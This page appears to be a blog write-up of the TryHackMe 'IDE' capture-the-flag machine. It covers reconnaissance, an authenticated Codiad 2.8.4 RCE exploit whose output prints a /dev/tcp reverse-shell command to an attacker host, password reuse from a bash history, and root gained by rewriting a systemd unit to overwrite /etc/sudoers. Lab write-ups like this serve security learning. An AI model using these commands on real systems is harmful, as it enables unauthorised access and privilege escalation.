@@ -1,0 +1,327 @@
+<!doctype html><html lang=en>
+<head>
+<title>
+IDE - Write Up ::
+Lanfran02 - Blog — Where write-ups are made.
+</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="Link Level Creator     Here Easy bluestorm and 403Exploit    Reconn Hey! Welcome back! As you may know, we start the CTFs with an nmap scan, so let&amp;rsquo;s do the same with this one!
+╰─ lanfran@parrot ❯ sudo nmap 10.10.233.193 -p- -sS --min-rate 5000 -n -Pn [sudo] password for lanfran: Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower.">
+<meta name=keywords content="CTF,Writeup,Hacking">
+<meta name=robots content="noodp">
+<link rel=canonical href=/posts/ide/>
+<link rel=stylesheet href=/assets/style.css>
+<link rel=stylesheet href=/style.css>
+<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
+<link rel="shortcut icon" href=/img/favicon.png>
+<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="/posts/ide/cover.jpeg">
+<meta name=twitter:title content="IDE - Write Up">
+<meta name=twitter:description content="TryHackMe's easy level machine.">
+<meta property="og:title" content="IDE - Write Up">
+<meta property="og:description" content="TryHackMe's easy level machine.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="/posts/ide/"><meta property="og:image" content="/posts/ide/cover.jpeg"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-10-16T16:15:25+02:00">
+<meta property="article:modified_time" content="2021-10-16T16:15:25+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+</head>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/ class=logo style=text-decoration:none>
+<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+<span class=logo__text>Lanfran02</span>
+<span class=logo__cursor></span>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about>About</a></li>
+<li><a href=/es/>Español</a></li>
+<ul class=menu__sub-inner>
+<li class=menu__sub-inner-more-trigger>
+Write Ups
+<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+</li>
+<ul class="menu__sub-inner-more hidden">
+<li><a href=/tags/hackthebox/>HTB</a></li>
+<li><a href=/tags/tryhackme/>THM</a></li>
+</ul>
+</ul>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about>About</a></li>
+<li><a href=/es/>Español</a></li>
+<li><a href=/tags/hackthebox/>HTB</a></li>
+<li><a href=/tags/tryhackme/>THM</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>IDE - Write Up</h1>
+<div class=post-meta>
+<span class=post-date>
+2021-10-16
+</span>
+<span class=post-author>— Written by Lanfran02</span>
+<span class=post-read-time>— 5 min read</span>
+</div>
+<span class=post-tags>
+<a href=/tags/ftp/>#FTP</a>&nbsp;
+<a href=/tags/nc/>#nc</a>&nbsp;
+<a href=/tags/codiad/>#Codiad</a>&nbsp;
+<a href=/tags/sudo/>#sudo</a>&nbsp;
+<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
+</span>
+<figure class=post-cover>
+<img src=/posts/ide/cover.jpeg alt="IDE - Write Up">
+</figure>
+<div class=post-content>
+<h2>Table of Contents</h2>
+<aside class=table-of-contents><nav id=TableOfContents>
+<ul>
+<li><a href=#reconn>Reconn</a></li>
+<li><a href=#foothold---user>Foothold - User</a></li>
+<li><a href=#root>Root</a></li>
+</ul>
+</nav></aside>
+<table>
+<thead>
+<tr>
+<th>Link</th>
+<th>Level</th>
+<th>Creator</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href=https://tryhackme.com/room/ide>Here</a></td>
+<td>Easy</td>
+<td><a href=https://tryhackme.com/p/bluestorm>bluestorm</a> and <a href=https://tryhackme.com/p/403Exploit>403Exploit</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id=reconn>Reconn</h2>
+<p>Hey! Welcome back!
+As you may know, we start the CTFs with an <code>nmap</code> scan, so let&rsquo;s do the same with this one!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ sudo nmap 10.10.233.193 -p- -sS --min-rate <span style=color:#ae81ff>5000</span> -n -Pn
+<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
+Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times will be slower.
+Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-10-16 00:11 CEST
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.233.193
+Host is up <span style=color:#f92672>(</span>0.056s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>65532</span> closed ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+80/tcp    open  http
+62337/tcp open  unknown
+
+Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 14.25 seconds
+</code></pre></div><p>Great! We now have more information:
+· We have an FTP server running at port <code>21</code>.
+· An SSH service running on port <code>22</code>.
+· A web server on port <code>80</code>.
+· An unknown service running on <code>62337</code>.</p>
+<p>Alright, let&rsquo;s try to download all the data that we can from the <code>FTP</code> server with the user <code>anonymous</code> (If you didn&rsquo;t know the user <code>anonymous</code> it&rsquo;s a default account that doesn&rsquo;t require a password to login on the <code>FTP</code> server).</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ wget -m ftp://anonymous@10.10.78.174
+--2021-10-16 00:18:16--  ftp://anonymous@10.10.78.174/
+           <span style=color:#f92672>=</span>&gt; ‘10.10.78.174/.listing’
+Connecting to 10.10.78.174:21... connected.
+Logging in as anonymous ... Logged in!
+<span style=color:#f92672>==</span>&gt; SYST ... <span style=color:#66d9ef>done</span>.    <span style=color:#f92672>==</span>&gt; PWD ... <span style=color:#66d9ef>done</span>.
+<span style=color:#f92672>==</span>&gt; TYPE I ... <span style=color:#66d9ef>done</span>.  <span style=color:#f92672>==</span>&gt; CWD not needed.
+<span style=color:#f92672>==</span>&gt; PASV ... <span style=color:#66d9ef>done</span>.    <span style=color:#f92672>==</span>&gt; LIST ... <span style=color:#66d9ef>done</span>.
+
+10.10.78.174/.listing                 <span style=color:#f92672>[</span> &lt;<span style=color:#f92672>=</span>&gt;                                                        <span style=color:#f92672>]</span>     <span style=color:#ae81ff>180</span>  --.-KB/s    in 0s      
+
+2021-10-16 00:18:16 <span style=color:#f92672>(</span>6.37 MB/s<span style=color:#f92672>)</span> - ‘10.10.78.174/.listing’ saved <span style=color:#f92672>[</span>180<span style=color:#f92672>]</span>
+
+--2021-10-16 00:18:16--  ftp://anonymous@10.10.78.174/.../
+           <span style=color:#f92672>=</span>&gt; ‘10.10.78.174/.../.listing’
+<span style=color:#f92672>==</span>&gt; CWD <span style=color:#f92672>(</span>1<span style=color:#f92672>)</span> /... ... <span style=color:#66d9ef>done</span>.
+<span style=color:#f92672>==</span>&gt; PASV ... <span style=color:#66d9ef>done</span>.    <span style=color:#f92672>==</span>&gt; LIST ... <span style=color:#66d9ef>done</span>.
+
+10.10.78.174/.../.listing             <span style=color:#f92672>[</span> &lt;<span style=color:#f92672>=</span>&gt;                                                        <span style=color:#f92672>]</span>     <span style=color:#ae81ff>178</span>  --.-KB/s    in 0s      
+
+2021-10-16 00:18:17 <span style=color:#f92672>(</span>3.11 MB/s<span style=color:#f92672>)</span> - ‘10.10.78.174/.../.listing’ saved <span style=color:#f92672>[</span>178<span style=color:#f92672>]</span>
+
+--2021-10-16 00:18:17--  ftp://anonymous@10.10.78.174/.../-
+           <span style=color:#f92672>=</span>&gt; ‘10.10.78.174/.../-’
+<span style=color:#f92672>==</span>&gt; CWD not required.
+<span style=color:#f92672>==</span>&gt; PASV ... <span style=color:#66d9ef>done</span>.    <span style=color:#f92672>==</span>&gt; RETR - ... <span style=color:#66d9ef>done</span>.
+Length: <span style=color:#ae81ff>151</span>
+
+10.10.78.174/.../-                100%<span style=color:#f92672>[===========================================================</span>&gt;<span style=color:#f92672>]</span>     <span style=color:#ae81ff>151</span>  --.-KB/s    in 0.1s    
+
+2021-10-16 00:18:17 <span style=color:#f92672>(</span>1.15 KB/s<span style=color:#f92672>)</span> - ‘10.10.78.174/.../-’ saved <span style=color:#f92672>[</span>151<span style=color:#f92672>]</span>
+
+FINISHED --2021-10-16 00:18:17--
+Total wall clock time: 1.5s
+Downloaded: <span style=color:#ae81ff>3</span> files, <span style=color:#ae81ff>509</span> in 0.1s <span style=color:#f92672>(</span>3.88 KB/s<span style=color:#f92672>)</span>
+</code></pre></div><p>Wow! We have some weird names for the folder and the file&mldr;</p>
+<p>So let&rsquo;s try to rename the <code>-</code> file to a more friendly name and see what it has inside!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ mv <span style=color:#ae81ff>\-</span> data
+
+╰─ lanfran@parrot ❯ cat data
+Hey john,
+I have reset the password as you have asked. Please use the default password to login. 
+Also, please take care of the image file ;<span style=color:#f92672>)</span>
+- drac.
+</code></pre></div><p>Mmmm&mldr;. we know now that the user <code>john</code> has his password reseted to the default one&mldr;</p>
+<p>Let&rsquo;s see what&rsquo;s on port <code>80</code> and port <code>62337</code>.</p>
+<p><img src=version.png alt=loginpage></p>
+<p>After some research, the port <code>80</code> has just a default apache2 web server running, the insterest web page is on port <code>62337</code>.</p>
+<p>We have a login page for <code>Codiad</code>, a web based IDE! And we also know that the version is <code>2.8.4</code>!</p>
+<h2 id=foothold---user>Foothold - User</h2>
+<p>So, after googling something easy as <code>Codiad 2.8.4 exploit</code>, I found a public exploit to get RCE with an authenticated user! <a href>Here&rsquo;s the link to the exploit</a></p>
+<p>So far so good, let&rsquo;s run the exploit!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ python3 exp.py http://10.10.233.193:62337/ john <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span> 10.9.4.36 <span style=color:#ae81ff>1337</span> linux
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Please execute the following command on your vps: 
+echo <span style=color:#e6db74>&#39;bash -c &#34;bash -i &gt;/dev/tcp/10.9.4.36/1338 0&gt;&amp;1 2&gt;&amp;1&#34;&#39;</span> | nc -lnvp <span style=color:#ae81ff>1337</span>
+nc -lnvp <span style=color:#ae81ff>1338</span>
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Please confirm that you have <span style=color:#66d9ef>done</span> the two command above <span style=color:#f92672>[</span>y/n<span style=color:#f92672>]</span>
+<span style=color:#f92672>[</span>Y/n<span style=color:#f92672>]</span> y  
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting...
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Login Content : <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;status&#34;</span>:<span style=color:#e6db74>&#34;success&#34;</span>,<span style=color:#e6db74>&#34;data&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;username&#34;</span>:<span style=color:#e6db74>&#34;john&#34;</span><span style=color:#f92672>}}</span>
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Login success!
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Getting writeable path...
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Path Content : <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;status&#34;</span>:<span style=color:#e6db74>&#34;success&#34;</span>,<span style=color:#e6db74>&#34;data&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;CloudCall&#34;</span>,<span style=color:#e6db74>&#34;path&#34;</span>:<span style=color:#e6db74>&#34;\/var\/www\/html\/codiad_projects&#34;</span><span style=color:#f92672>}}</span>
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Writeable Path : /var/www/html/codiad_projects
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Sending payload...
+</code></pre></div><p>After running the commands that the exploit suggest, we finally have a foothold on the machine!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -lnvp <span style=color:#ae81ff>1338</span>
+listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1338</span> ...
+connect to <span style=color:#f92672>[</span>10.9.4.36<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.233.193<span style=color:#f92672>]</span> <span style=color:#ae81ff>46490</span>
+bash: cannot set terminal process group <span style=color:#f92672>(</span>866<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
+bash: no job control in this shell
+www-data@ide:/var/www/html/codiad/components/filemanager$ id
+id
+uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
+</code></pre></div><p>But&mldr; We can&rsquo;t read the user flag, because we need to escalate to user <code>drac</code> to read the flag&mldr;</p>
+<p>So digging around the machine, we find that the user <code>drac</code> has the <code>.bash_history</code> with some information inside!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@ide:/home/drac$ cat .bash_history 
+mysql -u drac -p <span style=color:#e6db74>&#39;[REDACTED]&#39;</span>
+</code></pre></div><p>Hey! We found a password! Maybe this user reutilize the password&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@ide:/home/drac$ su drac 
+Password: 
+drac@ide:~$ cat /home/drac/user.txt 
+0<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span><span style=color:#ae81ff>6</span>
+</code></pre></div><p>YES! We did it!</p>
+<h2 id=root>Root</h2>
+<p>Now we need to escalate to root!</p>
+<p>For this, we do the first try as in every machine <code>sudo -l</code>, and we can restart the <code>vsftpd</code> service!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>drac@ide:~$ sudo -l
+<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> drac: 
+Matching Defaults entries <span style=color:#66d9ef>for</span> drac on ide:
+    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
+
+User drac may run the following commands on ide:
+    <span style=color:#f92672>(</span>ALL : ALL<span style=color:#f92672>)</span> /usr/sbin/service vsftpd restart
+</code></pre></div><p>So maybe we can exploit this service if we can edit the <code>vsftpd.service</code> file!</p>
+<p>And yes! We can edit it!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>drac@ide:~$ cat /lib/systemd/system/vsftpd.service
+<span style=color:#f92672>[</span>Unit<span style=color:#f92672>]</span>
+Description<span style=color:#f92672>=</span>vsftpd FTP server
+After<span style=color:#f92672>=</span>network.target
+
+<span style=color:#f92672>[</span>Service<span style=color:#f92672>]</span>
+Type<span style=color:#f92672>=</span>simple
+ExecStart<span style=color:#f92672>=</span>/usr/sbin/vsftpd /etc/vsftpd.conf
+ExecReload<span style=color:#f92672>=</span>/bin/kill -HUP $MAINPID
+ExecStartPre<span style=color:#f92672>=</span>-/bin/mkdir -p /var/run/vsftpd/empty
+
+<span style=color:#f92672>[</span>Install<span style=color:#f92672>]</span>
+WantedBy<span style=color:#f92672>=</span>multi-user.target
+drac@ide:~$ nano /lib/systemd/system/vsftpd.service
+drac@ide:~$
+</code></pre></div><p>So let&rsquo;s edit it to execute a command:
+<code>ExecStart=/bin/sh -c 'echo "drac ALL=(root) NOPASSWD: ALL" > /etc/sudoers'</code></p>
+<p>This command will add our user <code>drac</code> into the <code>sudoers</code> file to run all the commands as <code>root</code>!</p>
+<p>So after editing the file, it should look like this:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>drac@ide:~$ cat /lib/systemd/system/vsftpd.service
+<span style=color:#f92672>[</span>Unit<span style=color:#f92672>]</span>
+Description<span style=color:#f92672>=</span>vsftpd FTP server
+After<span style=color:#f92672>=</span>network.target
+
+<span style=color:#f92672>[</span>Service<span style=color:#f92672>]</span>
+Type<span style=color:#f92672>=</span>simple
+ExecStart<span style=color:#f92672>=</span>/bin/sh -c <span style=color:#e6db74>&#39;echo &#34;drac ALL=(root) NOPASSWD: ALL&#34; &gt; /etc/sudoers&#39;</span>
+ExecReload<span style=color:#f92672>=</span>/bin/kill -HUP $MAINPID
+ExecStartPre<span style=color:#f92672>=</span>-/bin/mkdir -p /var/run/vsftpd/empty
+
+<span style=color:#f92672>[</span>Install<span style=color:#f92672>]</span>
+WantedBy<span style=color:#f92672>=</span>multi-user.target
+</code></pre></div><p>Great! Let&rsquo;s restart the service and reload the units:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>drac@ide:~$ sudo /usr/sbin/service vsftpd restart
+Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run <span style=color:#e6db74>&#39;systemctl daemon-reload&#39;</span> to reload units.
+drac@ide:~$ systemctl daemon-reload
+<span style=color:#f92672>====</span> AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon <span style=color:#f92672>===</span>
+Authentication is required to reload the systemd state.
+Authenticating as: drac
+Password: 
+<span style=color:#f92672>====</span> AUTHENTICATION COMPLETE <span style=color:#f92672>===</span>
+drac@ide:~$ sudo /usr/sbin/service vsftpd restart
+</code></pre></div><p>After this, we can check if our exploit worked!</p>
+<p>YES! We can now run <code>sudo</code> to everything!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>drac@ide:~$ sudo -l
+User drac may run the following commands on ide:
+    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: ALL
+</code></pre></div><p>So let&rsquo;s just run <code>sudo su</code> to get <code>root</code></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>drac@ide:~$ sudo su
+root@ide:/home/drac# id
+uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
+root@ide:/home/drac# cat /root/root.txt 
+c<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>d
+</code></pre></div><p>And we rooted the machine!</p>
+<p>That&rsquo;s all from my side, hope you find this helpful!</p>
+</div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button next">
+<a href=/posts/jason/>
+<span class=button__text>Jason - Write Up</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user">Lanfran02</div>
+</div>
+</footer>
+<script src=/assets/main.js></script>
+<script src=/assets/prism.js></script>
+</div>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
+</body>
+</html>
